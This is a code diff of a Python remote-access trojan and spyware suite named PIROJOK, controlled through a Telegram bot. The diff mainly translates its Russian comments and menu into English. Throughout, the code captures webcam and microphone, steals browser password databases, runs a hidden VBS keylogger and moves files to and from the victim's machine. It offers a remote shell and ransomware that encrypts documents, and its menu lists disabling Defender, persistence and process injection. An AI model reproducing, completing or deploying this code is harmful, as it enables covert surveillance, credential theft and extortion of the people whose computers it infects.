@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PIROJOK 7.0 - ПОЛНЫЙ КОМПЛЕКС ШПИОНАЖА
-Включает: кейлоггер, загрузка/выгрузка, буфер обмена, удаленная консоль,
-кража паролей, геолокация, микрофон, веб-камера
+PIROJOK 7.0 - COMPLETE SPY SUITE
+Includes: keylogger, file upload/download, clipboard, remote shell,
+password stealing, geolocation, microphone, webcam
 """
 
 import os
@@ -30,7 +30,7 @@ import psutil
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
-# ========== ОПЦИОНАЛЬНЫЕ ИМПОРТЫ (с защитой от ошибок) ==========
+# ========== OPTIONAL IMPORTS (with error protection) ==========
 try:
     import cv2
     WEBCAM_AVAILABLE = True
@@ -55,7 +55,7 @@ BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
 YOUR_TELEGRAM_ID = int(os.getenv('TELEGRAM_ID', '123456789'))
 
 class SpyModule:
-    """Модуль шпионажа - камера, микрофон, геолокация и т.д."""
+    """Spy module - camera, microphone, geolocation, etc."""
     
     def __init__(self, parent):
         self.p = parent
@@ -63,9 +63,9 @@ class SpyModule:
         self.keylog_file = os.path.join(tempfile.gettempdir(), "keylog.txt")
         self.keylogger_thread = None
         
-    # ========== ВЕБ-КАМЕРА ==========
+    # ========== WEBCAM ==========
     def capture_webcam(self):
-        """Сделать фото с веб-камеры"""
+        """Take photo from webcam"""
         try:
             if not WEBCAM_AVAILABLE:
                 return "[ERROR] OpenCV not installed"
@@ -78,11 +78,11 @@ class SpyModule:
             camera.release()
             
             if return_value:
-                # Сохраняем во временный файл
+                # Save to temp file
                 img_path = os.path.join(tempfile.gettempdir(), "webcam.jpg")
                 cv2.imwrite(img_path, image)
                 
-                # Читаем для отправки
+                # Read for sending
                 with open(img_path, 'rb') as f:
                     img_data = f.read()
                 
@@ -93,27 +93,27 @@ class SpyModule:
         except Exception as e:
             return f"[ERROR] Webcam error: {e}"
     
-    # ========== МИКРОФОН ==========
+    # ========== MICROPHONE ==========
     def record_microphone(self, seconds=5):
-        """Записать звук с микрофона"""
+        """Record sound from microphone"""
         try:
             if not MIC_AVAILABLE:
                 return "[ERROR] Sounddevice not installed"
             
             seconds = int(seconds)
-            fs = 44100  # Частота дискретизации
+            fs = 44100  # Sample rate
             
             self.p.send_message(self.p.owner_id, f"[MIC] Recording {seconds} seconds...")
             
-            # Запись
+            # Record
             recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
             sd.wait()
             
-            # Сохраняем
+            # Save
             audio_path = os.path.join(tempfile.gettempdir(), "recording.wav")
             sf.write(audio_path, recording, fs)
             
-            # Читаем для отправки
+            # Read for sending
             with open(audio_path, 'rb') as f:
                 audio_data = f.read()
             
@@ -122,35 +122,35 @@ class SpyModule:
         except Exception as e:
             return f"[ERROR] Microphone error: {e}"
     
-    # ========== ГЕОЛОКАЦИЯ ==========
+    # ========== GEOLOCATION ==========
     def get_location(self):
-        """Определить местоположение по IP и Wi-Fi"""
+        """Get location by IP and Wi-Fi"""
         try:
             result = []
             result.append("[LOCATION] Geolocation data:")
             
-            # По IP
+            # By IP
             try:
                 ip_response = requests.get('http://ip-api.com/json/', timeout=5)
                 if ip_response.status_code == 200:
                     data = ip_response.json()
-                    result.append(f"🌐 IP: {data['query']}")
-                    result.append(f"📍 Страна: {data['country']}")
-                    result.append(f"🏙️ Город: {data['city']}")
-                    result.append(f"📡 Провайдер: {data['isp']}")
-                    result.append(f"🗺️ Координаты: {data.get('lat', '?')}, {data.get('lon', '?')}")
+                    result.append(f"IP: {data['query']}")
+                    result.append(f"Country: {data['country']}")
+                    result.append(f"City: {data['city']}")
+                    result.append(f"ISP: {data['isp']}")
+                    result.append(f"Coordinates: {data.get('lat', '?')}, {data.get('lon', '?')}")
             except:
-                result.append("🌐 IP: неизвестно")
+                result.append("IP: unknown")
             
-            # Wi-Fi сети
+            # Wi-Fi networks
             try:
                 wifi_result = subprocess.run(['netsh', 'wlan', 'show', 'networks'], 
                                             capture_output=True, text=True, encoding='cp866')
                 if wifi_result.returncode == 0:
-                    result.append("\n📶 Доступные Wi-Fi сети:")
+                    result.append("\nAvailable Wi-Fi networks:")
                     lines = wifi_result.stdout.split('\n')
                     for line in lines:
-                        if 'SSID' in line or 'Сигнал' in line:
+                        if 'SSID' in line or 'Signal' in line:
                             result.append(f"   {line.strip()}")
             except:
                 pass
@@ -159,9 +159,9 @@ class SpyModule:
         except Exception as e:
             return f"[ERROR] Location error: {e}"
     
-    # ========== КРАЖА ПАРОЛЕЙ ==========
+    # ========== PASSWORD STEALING ==========
     def steal_passwords(self):
-        """Украсть сохраненные пароли из браузеров"""
+        """Steal saved passwords from browsers"""
         try:
             results = []
             results.append("[PASSWORDS] Browser password databases:")
@@ -171,13 +171,13 @@ class SpyModule:
             if os.path.exists(chrome_path):
                 dest = os.path.join(tempfile.gettempdir(), 'chrome_passwords.db')
                 try:
-                    # Нужно закрыть Chrome перед копированием
+                    # Need to close Chrome before copying
                     os.system('taskkill /f /im chrome.exe >nul 2>&1')
                     time.sleep(1)
                     shutil.copy2(chrome_path, dest)
-                    results.append(f"✅ Chrome: {dest}")
+                    results.append(f"OK Chrome: {dest}")
                 except:
-                    results.append("❌ Chrome: failed to copy")
+                    results.append("FAIL Chrome: failed to copy")
             
             # Firefox
             firefox_profile = os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles')
@@ -191,9 +191,9 @@ class SpyModule:
                                 os.system('taskkill /f /im firefox.exe >nul 2>&1')
                                 time.sleep(1)
                                 shutil.copy2(logins_path, dest)
-                                results.append(f"✅ Firefox: {dest}")
+                                results.append(f"OK Firefox: {dest}")
                             except:
-                                results.append("❌ Firefox: failed to copy")
+                                results.append("FAIL Firefox: failed to copy")
             
             # Edge
             edge_path = os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data')
@@ -203,17 +203,17 @@ class SpyModule:
                     os.system('taskkill /f /im msedge.exe >nul 2>&1')
                     time.sleep(1)
                     shutil.copy2(edge_path, dest)
-                    results.append(f"✅ Edge: {dest}")
+                    results.append(f"OK Edge: {dest}")
                 except:
-                    results.append("❌ Edge: failed to copy")
+                    results.append("FAIL Edge: failed to copy")
             
             return "\n".join(results)
         except Exception as e:
             return f"[ERROR] Password stealing failed: {e}"
     
-    # ========== БУФЕР ОБМЕНА ==========
+    # ========== CLIPBOARD ==========
     def get_clipboard(self):
-        """Получить содержимое буфера обмена"""
+        """Get clipboard content"""
         try:
             if not CLIPBOARD_AVAILABLE:
                 return "[ERROR] win32clipboard not installed"
@@ -232,26 +232,26 @@ class SpyModule:
         except Exception as e:
             return f"[ERROR] Clipboard error: {e}"
     
-    # ========== КЕЙЛОГГЕР ==========
+    # ========== KEYLOGGER ==========
     def start_keylogger(self):
-        """Запустить кейлоггер"""
+        """Start keylogger"""
         try:
             if self.keylogger_active:
                 return "[KEYLOG] Already running"
             
-            # Создаем VBS скрипт для кейлоггера
+            # Create VBS script for keylogger
             vbs_path = os.path.join(tempfile.gettempdir(), "keylogger.vbs")
             log_path = self.keylog_file
             
             with open(vbs_path, 'w') as f:
                 f.write(f'''
-' Кейлоггер на VBS
+' VBS Keylogger
 Dim WSH, FSO, logFile
 Set WSH = CreateObject("WScript.Shell")
 Set FSO = CreateObject("Scripting.FileSystemObject")
 logFile = "{log_path}"
 
-' Словарь для специальных клавиш
+' Dictionary for special keys
 Dim specialKeys
 Set specialKeys = CreateObject("Scripting.Dictionary")
 specialKeys.Add 8, "[BACKSPACE]"
@@ -288,7 +288,7 @@ specialKeys.Add 121, "[F10]"
 specialKeys.Add 122, "[F11]"
 specialKeys.Add 123, "[F12]"
 
-' Основной цикл
+' Main loop
 Do While True
     For i = 8 To 255
         If specialKeys.Exists(i) Then
@@ -298,7 +298,7 @@ Do While True
         End If
         
         If WSH.LogEvent(i) Then
-            ' Записываем в файл
+            ' Write to file
             FSO.OpenTextFile(logFile, 8, True).Write key
         End If
     Next
@@ -306,7 +306,7 @@ Do While True
 Loop
 ''')
             
-            # Запускаем скрыто
+            # Run hidden
             subprocess.Popen(['wscript', '//B', vbs_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
@@ -316,7 +316,7 @@ Loop
             return f"[ERROR] Keylogger failed: {e}"
     
     def stop_keylogger(self):
-        """Остановить кейлоггер"""
+        """Stop keylogger"""
         try:
             os.system('taskkill /f /im wscript.exe /fi "windowtitle eq *keylogger*" >nul 2>&1')
             self.keylogger_active = False
@@ -325,19 +325,19 @@ Loop
             return "[KEYLOG] Failed to stop"
     
     def get_keylog(self):
-        """Получить лог нажатий"""
+        """Get keylog data"""
         try:
             if os.path.exists(self.keylog_file):
                 with open(self.keylog_file, 'r', encoding='utf-8', errors='ignore') as f:
                     data = f.read()
-                return f"[KEYLOG]\n{data[-1000:]}"  # Последние 1000 символов
+                return f"[KEYLOG]\n{data[-1000:]}"  # Last 1000 chars
             else:
                 return "[KEYLOG] No data yet"
         except Exception as e:
             return f"[ERROR] {e}"
     
     def clear_keylog(self):
-        """Очистить лог"""
+        """Clear keylog"""
         try:
             if os.path.exists(self.keylog_file):
                 os.remove(self.keylog_file)
@@ -347,7 +347,7 @@ Loop
 
 
 class FileManager:
-    """Модуль управления файлами - загрузка/выгрузка"""
+    """File management module - upload/download"""
     
     def __init__(self, parent):
         self.p = parent
@@ -355,14 +355,14 @@ class FileManager:
         os.makedirs(self.download_folder, exist_ok=True)
     
     def upload_file(self, filepath):
-        """Отправить файл с духовки в Telegram"""
+        """Send file from victim to Telegram"""
         try:
             if not os.path.exists(filepath):
                 return f"[ERROR] File not found: {filepath}"
             
-            # Проверяем размер
+            # Check size
             file_size = os.path.getsize(filepath)
-            if file_size > 50 * 1024 * 1024:  # 50 MB лимит Telegram
+            if file_size > 50 * 1024 * 1024:  # 50 MB Telegram limit
                 return "[ERROR] File too large (max 50MB)"
             
             with open(filepath, 'rb') as f:
@@ -382,7 +382,7 @@ class FileManager:
             return f"[ERROR] {e}"
     
     def download_file(self, url, filename=None):
-        """Скачать файл на духовку из Telegram"""
+        """Download file to victim from Telegram"""
         try:
             if not filename:
                 filename = url.split('/')[-1].split('?')[0]
@@ -406,7 +406,7 @@ class FileManager:
             return f"[ERROR] {e}"
     
     def list_downloads(self):
-        """Список скачанных файлов"""
+        """List downloaded files"""
         try:
             files = os.listdir(self.download_folder)
             if not files:
@@ -417,7 +417,7 @@ class FileManager:
                 path = os.path.join(self.download_folder, f)
                 size = os.path.getsize(path)
                 modified = datetime.fromtimestamp(os.path.getmtime(path)).strftime('%Y-%m-%d %H:%M')
-                result.append(f"  📄 {f} ({size} bytes) - {modified}")
+                result.append(f"  {f} ({size} bytes) - {modified}")
             
             return "\n".join(result)
         except Exception as e:
@@ -425,14 +425,14 @@ class FileManager:
 
 
 class RemoteShell:
-    """Удаленная консоль"""
+    """Remote shell"""
     
     def __init__(self, parent):
         self.p = parent
         self.history = []
     
     def execute(self, command):
-        """Выполнить команду в cmd"""
+        """Execute command in cmd"""
         try:
             self.history.append(f"> {command}")
             
@@ -478,7 +478,7 @@ class RemoteShell:
             return f"[ERROR] {e}"
     
     def get_history(self):
-        """Показать историю команд"""
+        """Show command history"""
         return "\n".join(self.history[-20:])
 
 
@@ -767,7 +767,7 @@ class PirojokRansomware:
         self.ransom_note = "README_PIROJOK.txt"
         self.cmd_window = None
         self.active = False
-        # Расширения для шифрования
+        # Extensions to encrypt
         self.target_extensions = [
             '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
             '.pdf', '.jpg', '.jpeg', '.png', '.bmp', '.gif',
@@ -1102,14 +1102,16 @@ class Pirojok:
         self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
         self.running = True
         self.processes = []
-        self.version = "7.0"
+        self.version = "7.1"  # Updated version
         self.command_timeout = 60
         self.admin_mode = False
         self.startup_time = datetime.now()
         self.processing = False
         self.started = False
+        self.last_command = ""
+        self.last_command_time = datetime.now()
         
-        # Инициализация модулей
+        # Module initialization
         self.ransom = PirojokRansomware(self)
         self.hider = ProcessHider(self)
         self.spy = SpyModule(self)
@@ -1157,10 +1159,10 @@ class Pirojok:
             self.send_message(self.owner_id, f"[ERROR] {e}")
             return f"[ERROR] {e}"
     
-    # ========== КОМАНДЫ ДЛЯ МОДУЛЕЙ ==========
+    # ========== MODULE COMMANDS ==========
     
     def cmd_webcam(self):
-        """Сделать фото с веб-камеры"""
+        """Take photo from webcam"""
         result = self.spy.capture_webcam()
         if isinstance(result, bytes):
             self.send_photo(self.owner_id, result, "[WEBCAM] Photo")
@@ -1169,7 +1171,7 @@ class Pirojok:
             return result
     
     def cmd_mic(self, seconds=5):
-        """Записать микрофон"""
+        """Record microphone"""
         result = self.spy.record_microphone(seconds)
         if isinstance(result, bytes):
             self.send_audio(self.owner_id, result, f"[MIC] {seconds}s recording")
@@ -1178,53 +1180,53 @@ class Pirojok:
             return result
     
     def cmd_location(self):
-        """Определить местоположение"""
+        """Get location"""
         return self.spy.get_location()
     
     def cmd_passwords(self):
-        """Украсть пароли"""
+        """Steal passwords"""
         result = self.spy.steal_passwords()
         self.send_message(self.owner_id, result)
         return "[PASSWORDS] Check temp folder for databases"
     
     def cmd_clipboard(self):
-        """Получить буфер обмена"""
+        """Get clipboard"""
         return self.spy.get_clipboard()
     
     def cmd_keylog_start(self):
-        """Запустить кейлоггер"""
+        """Start keylogger"""
         return self.spy.start_keylogger()
     
     def cmd_keylog_stop(self):
-        """Остановить кейлоггер"""
+        """Stop keylogger"""
         return self.spy.stop_keylogger()
     
     def cmd_keylog_get(self):
-        """Получить лог нажатий"""
+        """Get keylog"""
         return self.spy.get_keylog()
     
     def cmd_keylog_clear(self):
-        """Очистить лог"""
+        """Clear keylog"""
         return self.spy.clear_keylog()
     
     def cmd_upload(self, filepath):
-        """Отправить файл с духовки"""
+        """Upload file from victim"""
         return self.files.upload_file(filepath)
     
     def cmd_download(self, url, filename=None):
-        """Скачать файл на духовку"""
+        """Download file to victim"""
         return self.files.download_file(url, filename)
     
     def cmd_list_downloads(self):
-        """Список скачанных файлов"""
+        """List downloaded files"""
         return self.files.list_downloads()
     
     def cmd_shell(self, command):
-        """Удаленная консоль"""
+        """Remote shell"""
         return self.shell.execute(command)
     
     def cmd_shell_history(self):
-        """История команд"""
+        """Command history"""
         return self.shell.get_history()
     
     def run_as_admin_command(self, command):
@@ -1607,7 +1609,7 @@ class Pirojok:
             print(f"Photo error: {e}")
     
     def send_audio(self, chat_id, audio_bytes, caption=""):
-        """Отправить аудиофайл"""
+        """Send audio file"""
         try:
             timestamp = datetime.now().strftime('%H:%M:%S')
             simple_caption = f"[{timestamp}] {caption}"
@@ -1622,7 +1624,7 @@ class Pirojok:
             print(f"Audio error: {e}")
     
     def send_file(self, chat_id, file_bytes, filename, caption=""):
-        """Отправить файл"""
+        """Send file"""
         try:
             timestamp = datetime.now().strftime('%H:%M:%S')
             simple_caption = f"[{timestamp}] {caption}"
@@ -1702,11 +1704,23 @@ class Pirojok:
         if chat_id != self.owner_id:
             self.send_message(chat_id, "[ERROR] Not for you!")
             return
+        
         print(f"Command: {text}")
+        
+        # ЗАЩИТА ОТ ДУБЛИРОВАНИЯ
         if self.processing:
             print("Already processing, skipping...")
             return
+        
+        # Проверяем, не обрабатывали ли мы эту команду недавно
+        if self.last_command == text and (datetime.now() - self.last_command_time).seconds < 2:
+            print(f"Duplicate command '{text}' ignored")
+            return
+        
         self.processing = True
+        self.last_command = text
+        self.last_command_time = datetime.now()
+        
         try:
             current_admin = self.check_admin()
             if current_admin != self.admin_mode:
@@ -1728,74 +1742,74 @@ class Pirojok:
             # === HELP / MENU ===
             if text == "help" or text == "menu":
                 help_text = """
-🔥 PIROJOK 7.0 - ПОЛНЫЙ КОМПЛЕКС ШПИОНАЖА 🔥
+🔥 PIROJOK 7.1 - COMPLETE SPY SUITE 🔥
 
-[🎥] ВИДЕО/АУДИО:
-• webcam - фото с веб-камеры
-• mic [сек] - запись микрофона (по умолч. 5 сек)
+[🎥] VIDEO/AUDIO:
+• webcam - take photo from webcam
+• mic [sec] - record microphone (default 5 sec)
 
-[📍] ГЕОЛОКАЦИЯ:
-• location - определить местоположение
-• wifi - показать Wi-Fi сети
+[📍] GEOLOCATION:
+• location - get location by IP
+• wifi - show Wi-Fi networks
 
-[🔑] КРАЖА ДАННЫХ:
-• passwords - украсть пароли из браузеров
-• clipboard - буфер обмена
-• keylog_start - запустить кейлоггер
-• keylog_stop - остановить кейлоггер
-• keylog_get - получить лог нажатий
-• keylog_clear - очистить лог
+[🔑] DATA THEFT:
+• passwords - steal browser passwords
+• clipboard - get clipboard content
+• keylog_start - start keylogger
+• keylog_stop - stop keylogger
+• keylog_get - get keylog
+• keylog_clear - clear keylog
 
-[📁] ФАЙЛЫ:
-• upload <путь> - отправить файл с духовки
-• download <url> [имя] - скачать файл на духовку
-• downloads - список скачанных файлов
+[📁] FILES:
+• upload <path> - upload file from victim
+• download <url> [name] - download file to victim
+• downloads - list downloaded files
 
-[💻] УДАЛЕННАЯ КОНСОЛЬ:
-• shell <команда> - выполнить команду
-• history - история команд
+[💻] REMOTE SHELL:
+• shell <command> - execute command
+• history - command history
 
 [🔒] RANSOMWARE:
-• ransom - ЗАПУСТИТЬ ВЫМОГАТЕЛЯ!
-• ransom_key - показать ключ
-• ransom_decrypt <key> - расшифровать
+• ransom - START RANSOMWARE!
+• ransom_key - show encryption key
+• ransom_decrypt <key> - decrypt files
 
-[🥷] МАСКИРОВКА:
-• mask_status - статус маскировки
-• mask_remove - снять маскировку
-• inject - внедриться в процесс
-• watchdog - самовосстановление
+[🥷] MASQUERADE:
+• mask_status - show masquerade status
+• mask_remove - remove masquerade
+• inject - inject into system process
+• watchdog - enable self-recovery
 
-[⚡] ПИТАНИЕ:
-• shutdown_now - выключить сейчас
-• reboot_now - перезагрузить сейчас
-• shutdown - выкл через 5 сек
-• reboot - перезагр через 5 сек
-• abort - отмена
+[⚡] POWER:
+• shutdown_now - shutdown immediately
+• reboot_now - reboot immediately
+• shutdown - shutdown in 5 sec
+• reboot - reboot in 5 sec
+• abort - abort shutdown
 
-[👑] АДМИН:
-• admin - запросить права
-• admin_check - проверить права
-• enable_rdp - включить RDP
-• disable_defender - отключить Defender
+[👑] ADMIN:
+• admin - request admin rights
+• admin_check - check admin status
+• enable_rdp - enable RDP
+• disable_defender - disable Defender
 
-[🔄] АВТОЗАПУСК:
-• startup_reg - в реестр
-• startup_folder - в папку
-• task_logon - планировщик (вход)
-• task_startup - планировщик (система)
-• startup_remove_all - удалить всё
-• startup_check - проверить автозагрузку
+[🔄] STARTUP:
+• startup_reg - add to registry
+• startup_folder - add to startup folder
+• task_logon - task scheduler (logon)
+• task_startup - task scheduler (system)
+• startup_remove_all - remove all
+• startup_check - check startup locations
 
-[📸] ОСНОВНОЕ:
-• shot - скриншот
-• info - информация
+[📸] BASIC:
+• shot - take screenshot
+• info - system info
                 """
                 self.send_message(chat_id, help_text)
                 self.processing = False
                 return
             
-            # === ШПИОНСКИЕ КОМАНДЫ ===
+            # === SPY COMMANDS ===
             if text == "webcam":
                 result = self.cmd_webcam()
                 self.send_message(chat_id, result)
@@ -1817,7 +1831,7 @@ class Pirojok:
                 return
             
             if text == "wifi":
-                result = self.spy.get_location()  # Там уже есть Wi-Fi
+                result = self.spy.get_location()  # Already has Wi-Fi
                 self.send_message(chat_id, result)
                 self.processing = False
                 return
@@ -1858,7 +1872,7 @@ class Pirojok:
                 self.processing = False
                 return
             
-            # === ФАЙЛОВЫЕ КОМАНДЫ ===
+            # === FILE COMMANDS ===
             if text.startswith("upload"):
                 parts = text.split(maxsplit=1)
                 if len(parts) == 2:
@@ -1887,7 +1901,7 @@ class Pirojok:
                 self.processing = False
                 return
             
-            # === УДАЛЕННАЯ КОНСОЛЬ ===
+            # === REMOTE SHELL ===
             if text.startswith("shell"):
                 cmd = text[5:].strip()
                 if cmd:
